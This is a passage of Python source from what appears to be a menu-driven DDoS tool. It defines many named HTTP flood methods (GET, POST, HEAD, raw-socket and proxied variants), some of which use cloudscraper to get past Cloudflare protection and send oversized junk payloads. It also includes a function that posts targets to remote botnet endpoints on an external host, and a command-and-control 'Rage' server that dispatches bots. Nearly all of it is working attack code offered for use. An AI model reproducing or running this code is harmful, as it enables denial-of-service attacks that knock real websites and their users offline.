                            thread = threading.Thread(target=get, args=(url, duration, scraper))
                            thread.start()
                            bot.append(thread)
                        for threads in bot:
                            threads.join()
                    def get(url, duration, scraper):
                        while (duration - datetime.datetime.now()).total_seconds() > 0:
                            try:
                                scraper.post(url, timeout=15)
                                requests.post(url, timeout=15)
                            except:
                                pass
                    if __name__ == '__main__':
                        url, threads, t = prompt.layer7_target()
                        timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'POST'))
                        timer.start()
                        starting(url, threads, t)
                        timer.join()
                def head():
                    def starting(url, threads, t):
                        duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                        session = requests.Session()
                        scraper = cloudscraper.create_scraper(sess=session)
                        bot = []
                        for _ in range(int(threads)):
                            thread = threading.Thread(target=get, args=(url, duration, scraper))
                            thread.start()
                            bot.append(thread)
                        for threads in bot:
                            threads.join()
                    def get(url, duration, scraper):
                        while (duration - datetime.datetime.now()).total_seconds() > 0:
                            try:
                                scraper.head(url, timeout=15)
                                requests.head(url, timeout=15)
                            except:
                                pass
                    if __name__ == '__main__':
                        url, threads, t = prompt.layer7_target()
                        timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'HEAD'))
                        timer.start()
                        starting(url, threads, t)
                        timer.join()
            class HOLD:
                def MYDOOM():
                    def starting(url, threads, t):
                        duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                        session = requests.Session()
                        scraper=cloudscraper.create_scraper(sess=session)
                        data = {
                            'data': "ZABCDEFG157".encode('utf-8')*16324,
                            'data': {
                                'X': 'X'*16324,
                                'Z': 'Z'*16324,
                                'Y': 'Y'*16324,
                                '57': '57'*16324
                            }
                        }
                        for _ in range(int(threads)):
                            thread = threading.Thread(target=mdoom, args=(url, duration, scraper, data))
                            thread.start()
                    def mdoom(url, duration, scraper, data):
                        while (duration - datetime.datetime.now()).total_seconds() > 0:
                            headers = {
                                "User-Agent": random.choice(user_agents),
                                "Host": urlparse(url).path,
                                "Range": "bytes=0-8192",
                                "Content-Length": "8192",
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                                'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                                'Cache-Control': 'no-cache',
                                'Pragma': 'no-cache',
                                'Connection': 'keep-alive',
                                'Upgrade-Insecure-Requests': '15',
                                'Sec-Fetch-Dest': 'document',
                                'Sec-Fetch-Mode': 'navigate',
                                'Sec-Fetch-Site': 'same-origin',
                                'Sec-Fetch-User': '?1',
                                'TE': 'trailers'
                            }
                            try:
                                scraper.post(url, data=data, headers=headers, timeout=20)
                                scraper.post(url, data=data, headers=headers, timeout=20)
                                for _ in range(1500):
                                    scraper.post(url, data=data, headers=headers, timeout=20)
                            except:
                                pass
                    if __name__ == '__main__':
                        url, threads, t = prompt.layer7_target()
                        timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'MYDOOM'))
                        timer.start()
                        starting(url, threads, t)
                        timer.join()
            def MIXSANZZ():
                def starting(url, threads, t, proxy):
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    session = requests.Session()
                    scraper = cloudscraper.create_scraper(sess=session, disableCloudflareV1=True, interpreter='nodejs')
                    botnet = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=attacks, args=(url, duration, scraper, proxy))
                        thread.start()
                        botnet.append(thread)
                    for threads in botnet:
                        threads.join()
                def attacks(url, duration, scraper, proxy):
                    ua = UserAgent()
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        'http': 'http://'+str(random.choice(list(proxzy))),
                        'https': 'http://'+str(random.choice(list(proxzy)))
                    }
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        headers={
                            "User-Agent": random.choice(user_agents),
                            "Host": url,
                            "Range": "bytes=0-8192",
                            "Content-Length": "8192",
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '15',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'same-origin',
                            'Sec-Fetch-User': '?1',
                            'TE': 'trailers'
                        }
                        try:
                            scraper.get(url, timeout=20, headers=headers, proxies=proksi)
                            scraper.get(url, timeout=20, headers=headers, proxies=proksi)
                            requests.get(url, timeout=20, headers=headers, proxies=proksi)
                            requests.get(url, timeout=20, headers=headers, proxies=proksi)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'MIXSANZZ'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            def AHEGAO():
                def starting(url, threads, t):
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    bot = []
                    for _ in range(int(threads)):
                        thr = threading.Thread(target=attack, args=(url, duration))
                        thr.start()
                        bot.append(thr)
                    for threads in bot:
                        threads.join()
                def attack(url, duration):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        scraper = cloudscraper.create_scraper(disableCloudflareV1=True, interpreter='nodejs')
                        h = {
                            "User-Agent": random.choice(user_agents),
                            "Upgrade-Insecure-Requests": "16",
                            "Connection": "keep-alive"
                        }
                        try:
                            scraper.get(url, timeout=20, headers=h)
                            requests.get(url, timeout=20, headers=h)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'AHEGAO'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def PXAHEGAO():
                def starting(url, threads, t, proxy):
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    bot = []
                    for _ in range(int(threads)):
                        thr = threading.Thread(target=attack, args=(url, duration, proxy))
                        thr.start()
                        bot.append(thr)
                    for threads in bot:
                        threads.join()
                def attack(url, duration, proxy):
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        scraper = cloudscraper.create_scraper(disableCloudflareV1=True, interpreter='nodejs')
                        ip_list = open('resources/logs/{}'.format(proxy), 'r')
                        ips = ip_list.readlines()
                        ip_list.close()
                        proxzy = ips
                        proksi = {
                            'http': 'http://'+str(random.choice(list(proxzy))),
                            'https': 'http://'+str(random.choice(list(proxzy)))
                        }
                        h = {
                            "User-Agent": random.choice(user_agents),
                            "Upgrade-Insecure-Requests": "16",
                            "Connection": "keep-alive"
                        }
                        try:
                            scraper.get(url, timeout=20, headers=h, proxies=proksi)
                            requests.get(url, timeout=20, headers=h, proxies=proksi)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXAHEGAO'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            def NUKE():
                def starting(url, threads, t, proxy):
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    bot = []
                    con = info.concurrent.concurrent()
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        'http': 'http://'+str(random.choice(list(proxzy))),
                        'https': 'http://'+str(random.choice(list(proxzy)))
                    }
                    def attacks(url, duration, proksi):
                        with ThreadPoolExecutor(max_workers=con) as executor:
                            executor.map(attack, [url, duration, proksi] * con)
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=attacks, args=(url, duration, proksi))
                        thread.start()
                        bot.append(thread)
                    for threads in bot:
                        threads.join()
                def attack(url, duration, proksi):
                    scraper = cloudscraper.create_scraper()
                    head = {
                        "User-Agent": random.choice(user_agents)
                    }
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            for _ in range(350):
                                scraper.get(url, proxies=proksi, timeout=15, headers=head)
                                scraper.get(url, proxies=proksi, timeout=15, headers=head)
                                requests.get(url, proxies=proksi, timeout=15, headers=head)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'NUKE'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            def PXLOWRAW():
                def starting(url, threads, t, proxy):
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        'http': 'http://'+str(random.choice(list(proxzy))),
                        'https': 'http://'+str(random.choice(list(proxzy)))
                    }
                    def thread():
                        for _ in range(5):
                            threading.Thread(target=send_request, args=(url, duration, proksi)).start()
                    for _ in range(int(threads)):
                        threading.Thread(target=thread).start()
                def send_request(url, duration, proksi):
                    scraper = cloudscraper.create_scraper()
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        raw = {
                            "ZABC57"*random.randint(1, 980)
                        }
                        headers = {
                            "User-Agent": random.choice(user_agents)
                        }
                        try:
                            scraper.post(url, data=raw, json=raw, timeout=15, headers=headers, proxies=proksi)
                            scraper.post(url, data=raw, json=raw, timeout=15, headers=headers, proxies=proksi)
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXLOWRAW'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            def DeltaSKY():
                def starting(url, threads, t):
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    loop = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=attackskys, args=(url, duration, client))
                        thread.start()
                        loop.append(thread)
                    for threads in loop:
                        threads.join()
                def attackskys(url, duration, client):
                    if 'https://' in url:
                        url = url.replace('https://', '')
                    elif 'http://' in url:
                        url = url.replace('http://', '')
                    url = url.replace('/', '')
                    targetz = target(url)
                    headers = "GET " + targetz['uri'] + " HTTP/1.1\n"
                    headers += "Host: " + targetz['host'] + "\n"
                    headers += 'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"\n'
                    headers += "sec-ch-ua-mobile: ?0\n"
                    headers += 'sec-ch-ua-platform: "Windows"\n'
                    headers += "DNT: 1\n"
                    headers += "Upgrade-Insecure-Requests: 15\n"
                    headers += f"User-Agent: {random.choice(user_agents)}\n"
                    headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n"
                    headers += "Sec-Fetch-Site: none\n"
                    headers += "Sec-Fetch-Mode: navigate\n"
                    headers += "Sec-Fetch-User: ?5\n"
                    headers += "Sec-Fetch-Dest: document\n"
                    headers += "Accept-Encoding: gzip, deflate, br, zstd\n"
                    headers += "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\n"
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            client.connect((str(targetz['host']), int(targetz['port'])))
                            client.send(headers)
                            client.close()
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'DeltaSKY'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def PXDeltaSKY():
                def starting(url, threads, t, proxy):
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = random.choice(proxzy)
                    client = socks.socksocket()
                    client.set_proxy(socks.HTTP, str(proksi[0]), int(proksi[1]))
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    loop = []
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=attackskys, args=(url, duration, client))
                        thread.start()
                        loop.append(thread)
                    for threads in loop:
                        threads.join()
                def attackskys(url, duration, client):
                    if 'https://' in url:
                        url = url.replace('https://', '')
                    elif 'http://' in url:
                        url = url.replace('http://', '')
                    url = url.replace('/', '')
                    targetz = target(url)
                    headers = "GET " + targetz['uri'] + " HTTP/1.1\n"
                    headers += "Host: " + targetz['host'] + "\n"
                    headers += 'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"\n'
                    headers += "sec-ch-ua-mobile: ?0\n"
                    headers += 'sec-ch-ua-platform: "Windows"\n'
                    headers += "DNT: 1\n"
                    headers += "Upgrade-Insecure-Requests: 15\n"
                    headers += f"User-Agent: {random.choice(user_agents)}\n"
                    headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n"
                    headers += "Sec-Fetch-Site: none\n"
                    headers += "Sec-Fetch-Mode: navigate\n"
                    headers += "Sec-Fetch-User: ?5\n"
                    headers += "Sec-Fetch-Dest: document\n"
                    headers += "Accept-Encoding: gzip, deflate, br, zstd\n"
                    headers += "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\n"
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            client.connect((str(targetz['host']), int(targetz['port'])))
                            client.send(str(headers))
                            client.close()
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXDeltaSKY'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            def SpaceD():
                def starting(url, threads, t):
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=spcd, args=(url, duration, client))
                        thread.start()
                def spcd(url, duration, client):
                    if 'https://' in url:
                        url = url.replace('https://', '')
                    elif 'http://' in url:
                        url = url.replace('http://', '')
                    url = url.replace('/', '')
                    targetz = target(url)
                    headers = "GET " + targetz['uri'] + " HTTP/1.1\n"
                    headers += "Host: " + targetz['host'] + "\n"
                    headers += 'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"\n'
                    headers += "sec-ch-ua-mobile: ?0\n"
                    headers += 'sec-ch-ua-platform: "Windows"\n'
                    headers += "DNT: 1\n"
                    headers += "Upgrade-Insecure-Requests: 15\n"
                    headers += f"User-Agent: {random.choice(user_agents)}\n"
                    headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n"
                    headers += "Sec-Fetch-Site: none\n"
                    headers += "Sec-Fetch-Mode: navigate\n"
                    headers += "Sec-Fetch-User: ?5\n"
                    headers += "Sec-Fetch-Dest: document\n"
                    headers += "Accept-Encoding: gzip, deflate, br, zstd\n"
                    headers += "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\n"
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            client.connect((str(targetz['host']), int(targetz['port'])))
                            client.sendto(headers, (str(targetz['host']), int(targetz['port'])))
                            client.close()
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'SpaceD'))
                    timer.start()
                    starting(url, threads, t)
                    timer.join()
            def PXSpaceD():
                def starting(url, threads, t, proxy):
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = random.choice(proxzy)
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    client = socks.socksocket()
                    client.set_proxy(socks.HTTP, str(proksi[0]), int(proksi[1]))
                    for _ in range(int(threads)):
                        thread = threading.Thread(target=spcd, args=(url, duration, client))
                        thread.start()
                def spcd(url, duration, client):
                    if 'https://' in url:
                        url = url.replace('https://', '')
                    elif 'http://' in url:
                        url = url.replace('http://', '')
                    url = url.replace('/', '')
                    targetz = target(url)
                    headers = "GET " + targetz['uri'] + " HTTP/1.1\n"
                    headers += "Host: " + targetz['host'] + "\n"
                    headers += 'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"\n'
                    headers += "sec-ch-ua-mobile: ?0\n"
                    headers += 'sec-ch-ua-platform: "Windows"\n'
                    headers += "DNT: 1\n"
                    headers += "Upgrade-Insecure-Requests: 15\n"
                    headers += f"User-Agent: {random.choice(user_agents)}\n"
                    headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n"
                    headers += "Sec-Fetch-Site: none\n"
                    headers += "Sec-Fetch-Mode: navigate\n"
                    headers += "Sec-Fetch-User: ?5\n"
                    headers += "Sec-Fetch-Dest: document\n"
                    headers += "Accept-Encoding: gzip, deflate, br, zstd\n"
                    headers += "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\n"
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            client.connect((str(targetz['host']), int(targetz['port'])))
                            client.sendto(headers, (str(targetz['host']), int(targetz['port'])))
                            client.close()
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'PXSpaceD'))
                    timer.start()
                    starting(url, threads, t, proxy)
                    timer.join()
            class SPECIAL:
                class start:
                    def freeze():
                        try:
                            uri, threads, time, proxy = proxied.layer7_target()
                            print(uri, threads, time, proxy)
                            ip_list = open('resources/logs/{}'.format(proxy), 'r')
                            ips = ip_list.readlines()
                            ip_list.close()
                            proxzy = ips
                            proxy1 = random.choice(proxzy)
                            proxy2 = random.choice(proxzy)
                            proxy3 = random.choice(proxzy)
                            proxy4 = random.choice(proxzy)
                            urlz = 'https://bnhsec.000webhostapp.com/ddos/index.php'
                            urlz2 = 'https://bnhsec.000webhostapp.com/ddos1/index.php'
                            urlz3 = 'https://bnhsec.000webhostapp.com/ddos2/index.php'
                            urlz4 = 'https://bnhsec.000webhostapp.com/ddos3/index.php'
                            payload1 = {'type': 'mtc2', 'status': 'success', 'url': uri, 'threads': threads, 'time': time, 'proxy': proxy1}
                            payload2 = {'type': 'mtc2', 'status': 'success', 'url': uri, 'threads': threads, 'time': time, 'proxy': proxy2}
                            payload3 = {'type': 'mtc2', 'status': 'success', 'url': uri, 'threads': threads, 'time': time, 'proxy': proxy3}
                            payload4 = {'type': 'mtc2', 'status': 'success', 'url': uri, 'threads': threads, 'time': time, 'proxy': proxy4}
                            response = requests.post(urlz, json=payload1)
                            requests.post(urlz2, json=payload2)
                            requests.post(urlz3, json=payload3)
                            requests.post(urlz4, json=payload4)
                            print(response.text)
                            clear()
                            a = open('resources/logs/recent.txt', 'r').readline()
                            if 'basicmode' in a:
                                logo.main()
                            elif 'deltamode' in a:
                                logo.main_delta()
                            else:
                                raise("GORMErr: An error occured!")
                            username=info.login.username()
                            vip=info.login.vip()
                            owner=info.login.owner()
                            url = uri
                            after = info.afterburn.botneted(username, time, threads, vip, owner, url, "Freeze [Special]", response.text)
                            stdout.write(after)
                            if 'basicmode' in a:
                                z = main.main()
                            elif 'deltamode' in a:
                                z = delta()
                            else:
                                raise("GORMErr: An error occured!")
                            return z
                        except:
                            print("[!] Maybe the botnet is down/freetime. Please wait about 1-2 minutes until the botnet is ready!")
            def Rage():
                print("{}[{}!{}]{} Starting Rage Server..".format(color.green(), color.white(), color.green(), color.white()))
                if os.name == 'nt':
                    subprocess.Popen(['pythonw.exe', '_server/botnet1.py'], shell=True)
                elif os.name == 'posix':
                    subprocess.Popen(['nohup python3', '_server/botnet1.py', '> botnet.log 2>&1 &'], shell=True)
                print("{}[{}!{}]{} Server Started..".format(color.green(), color.white(), color.green(), color.white()))
                print("{}[{}!{}]{} Starting DDoS...".format(color.red(), color.white(), color.red(), color.white()))
                url = input(""+'\033[0;31;40m'+"•"+'\033[0;33m'+" "+'\033[0m'+"URL             "+'\033[0;33m'+': '+'\033[0m')
                subprocess.Popen(['node', '_server/DDoS.js', url], shell=True)
                stdout.flush()
            def http_burn():
                """
                Code from: HulkDDoS (i think, cuz i forgor)
                """
                class ServerCommands:
                    READ_TARGET = 0
                    TERMINATE = 1
                    STOP = 2

                class ClientCommands:
                    STANDBY = 0
                    KILLED = 1
                    READ_STATUS = 2

                class StatusCodes:
                    PWNED = 0
                    ANTI_DDOS = 1
                    NOT_FOUND = 2
                    FORBIDDEN = 3
                    CONNECTION_FAILURE = 4

                class ErrorMessages:
                    CONNECTION_REFUSED = "Connection refused"
                    CONNECTION_RESET = "Connection reset"
                    CONNECTION_ABORTED = "Connection aborted"

                class Logger:
                    @staticmethod
                    def info(message):
                        print("[INFO] " + message)

                    @staticmethod
                    def error(message):
                        print("[ERROR] " + message)

                    @staticmethod
                    def success(message):
                        print("[SUCCESS] " + message)

                    @staticmethod
                    def incoming(message):
                        print("[INCOMING] " + message)

                    @staticmethod
                    def outgoing(message):
                        print("[OUTGOING] " + message)

                class RageServer:
                    def __init__(self, target, port=7777, persistent=False, max_missiles=10):
                        self.target = target
                        self.port = port
                        self.persistent = persistent
                        self.max_missiles = max_missiles
                        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.inputs = [self.server]
                        self.outputs = []
                        self.message_queues = {}
                        self.on_standby = []
                        self.address_cache = {}
                        self.completed = False
                        self.client_pattern = re.compile(r'<(.+?)>')

                        self.server.bind(('127.0.0.1', self.port))
                        self.server.listen(1)

                    def _accept_connections(self):
                        connection, address = self.server.accept()
                        hostname = f"{address[0]}:{address[1]}"
                        Logger.info(f"Established connection with Missile [{hostname}]")
                        connection.setblocking(False)
                        self.inputs.append(connection)
                        self.message_queues[connection] = []
                        self.address_cache[connection] = hostname

                    def _command(self, connection, data):
                        commands = re.find_all(self.client_pattern, data)
                        if not commands:
                            return
                        for cmd in commands:
                            self._handle_command(connection, cmd)

                    def _handle_command(self, connection, data):
                        hostname = self.address_cache[connection]
                        match = re.match(r'\d+', data)
                        if not match:
                            return
                        cmd = int(match.group(0))
                        if cmd == ClientCommands.STANDBY and connection not in self.on_standby:
                            self.on_standby.append(connection)
                            if len(self.on_standby) >= len(self.inputs) - 1:
                                self._fresh_start()
                        elif self.completed:
                            self._stop_all_bots(not self.persistent)
                        elif cmd not in ClientCommands.__dict__.values():
                            self._on_status_received(connection, data)
                        elif cmd == ClientCommands.KILLED:
                            connection.close()
                        elif cmd != ClientCommands.READ_STATUS and self.target:
                            self.message_queues[connection].append(ServerCommands.READ_TARGET)
                            self.message_queues[connection].append(self.target)
                        if connection not in self.outputs:
                            self.outputs.append(connection)

                    def _fresh_start(self):
                        self.target = self._get_new_target()
                        for bot in self.on_standby:
                            if bot not in self.outputs:
                                self.outputs.append(bot)
                            if bot not in self.inputs:
                                self.inputs.append(bot)
                            if bot not in self.message_queues:
                                self.message_queues[bot] = []
                            self.message_queues[bot].append(ServerCommands.READ_TARGET)
                            self.message_queues[bot].append(self.target)
                        self.on_standby = []

                    def _on_status_received(self, connection, data):
                        status = int(data)
                        if status >= StatusCodes.PWNED:
                            self.completed = True
                            Logger.success(f"Successfully DDoSed {self.target}")
                            if not self.persistent:
                                self._stop_all_bots()
                            else:
                                self.message_queues[connection].append(ServerCommands.READ_TARGET)
                                self.message_queues[connection].append(self.target)
                        elif status == StatusCodes.ANTI_DDOS:
                            Logger.error("The entered URL has DDoS protection, please retry.")
                            self._stop_all_bots()
                        elif status == StatusCodes.NOT_FOUND:
                            Logger.error("The entered URL is invalid, please retry.")
                            self._stop_all_bots()
                        elif status in [StatusCodes.FORBIDDEN, StatusCodes.CONNECTION_FAILURE]:
                            Logger.error("The entered URL is not accessible, please retry.")
                            self._stop_all_bots()
                        else:
                            self.message_queues[connection].append(ServerCommands.READ_TARGET)
                            self.message_queues[connection].append(self.target)

                    def _stop_all_bots(self, terminate=False):
                        for bot in self.message_queues:
                            self.message_queues[bot] = []
                            if bot not in self.on_standby:
                                self.message_queues[bot].append(ServerCommands.TERMINATE if terminate else ServerCommands.STOP)
                        self.target = None

                    def _get_new_target(self):
                        new_target = input("Enter the next URL (or 'quit' to exit): ")
                        if new_target.lower() == 'quit':
                            self.inputs = []
                            self.outputs = []
                            self.message_queues = {}
                            self.server.close()
                            return None
                        self.completed = False
                        return new_target

                    def launch(self):
                        Logger.success("Rage Server is Live!")
                        while self.inputs:
                            readable, writable, exceptional = select.select(self.inputs, self.outputs, self.inputs)
                            for s in readable:
                                if s is self.server:
                                    self._accept_connections()
                                else:
                                    data = s.recv(1024).decode('utf-8')
                                    if data:
                                        self._command(s, data)
                                    else:
                                        s.close()
                                        self.inputs.remove(s)
                                        if s in self.outputs:
                                            self.outputs.remove(s)
                                        del self.message_queues[s]
                                        del self.address_cache[s]

                target_url = prompt.onlyurl()
                rage_server = RageServer(target_url)
                rage_server.launch()
            def silent():
                def starting(url, threads, t):
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    bot=[]
                    for _ in range(int(threads)):
                        tr = threading.Thread(target=Attack, args=(url, duration))
                        tr.start()
                        bot.append(tr)
                    for threader in bot:
                        threader.join()
                def Attack(url, duration):
                    headers = {
                        "User-Agent": random.choice(user_agents),
                        "Upgrade-Insecure-Requests": '500',
                        "Content-Length": '50'
                    }
                    scraper = cloudscraper.create_scraper()
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            scraper.get(url, timeout=20, headers=headers)
                            requests.get(url, timeout=20, headers=headers)
                        except:
                            pass
                    return
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    starting(url, threads, t)
            def pxsilent():
                def starting(url, threads, t, proxy):
                    ip_list = open('resources/logs/{}'.format(proxy), 'r')
                    ips = ip_list.readlines()
                    ip_list.close()
                    proxzy = ips
                    proksi = {
                        "http": "http://"+str(random.choice(list(proxzy))),
                        "https": "http://"+str(random.choice(list(proxzy)))
                    }
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    bot = []
                    for _ in range(int(threads)):
                        tr = threading.Thread(target=Attack, args=(url, duration, proksi))
                        tr.start()
                        bot.append(tr)
                    for threader in bot:
                        threader.join()
                def Attack(url, duration, proksi):
                    headers = {
                        "User-Agent": random.choice(user_agents),
                        "Upgrade-Insecure-Requests": '500',
                        "Content-Length": '50'
                    }
                    scraper = cloudscraper.create_scraper()
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            scraper.get(url, timeout=20, headers=headers, proxies=proksi)
                            requests.get(url, timeout=20, headers=headers, proxies=proksi)
                        except:
                            pass
                    return
                if __name__ == '__main__':
                    url, threads, t, proxy = proxied.layer7_target()
                    starting(url, threads, t, proxy)
            def hoshino():
                text="Loading Hoshino Gun..."
                type.typing(text)
                text2="Loaded Successfully!"
                type.typing(text2)
                def attack_hoshino(url, threads, t):
                    duration = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
                    with ThreadPoolExecutor(max_workers=160) as execute:
                        execute.submit(kaboom, url, threads, duration)
                def kaboom(url, threads, duration):
                    cloud = cloudscraper.create_scraper()
                    while (duration - datetime.datetime.now()).total_seconds() > 0:
                        try:
                            for _ in range(threads):
                                cloud.post(url, json={"MUAHAHAZAXC17902"*5655}, data={'ZACH_9&<script type="'*1692}, timeout=5, headers={"User-Agent": UserAgent().chrome})
                                requests.post(url, json={"MUAHAHAZAXC17902"*5655}, data={'ZACH_9&<script type="'*1692}, timeout=5, headers={"User-Agent": UserAgent().chrome})
                        except:
                            pass
                if __name__ == '__main__':
                    url, threads, t = prompt.layer7_target()
                    timer = threading.Thread(target=countdown, args=(info.login.username(), t, threads, info.login.vip(), info.login.owner(), url, 'Takanshi Hoshino'))
                    timer.start()
                    attack_hoshino(url, threads, t)
                    timer.join()
    def delta():
        def mainz():
            open('resources/logs/recent.txt', 'w').write(str('deltamode')+'\r')
            while mainz:
                try:
                    PS1 = ""+'\033[1;35m'+"╭────["+'\033[0m'+"DeltaMode"+'\033[0;31;40m'+"@"+'\033[0m'+info.login.username()+'\033[1;35m'+"]\n"+'\033[1;35m'+"╰───>"+'\033[0m'+" "
                    prompt = input(PS1 + '')
                    if prompt.lower() == 'basic mode':
                        clear()
                        logo.main()
                        main.main()
                    elif prompt.lower() == 'help':
                        logo.help_delta()
                    elif prompt.lower() == 'layer7':
                        logo.layer7delta()
                    elif prompt.lower() == 'layer7delta':
                        logo.layer7delta
                    elif prompt.lower() == 'hoshino':
                        DDOS.method.hoshino()
                    elif prompt.lower() == 'layer4':
                        print("Layer4 Doesn't supported in Delta mode!")
                    elif prompt.lower() == 'colors':
                        logo.colorz_delta()
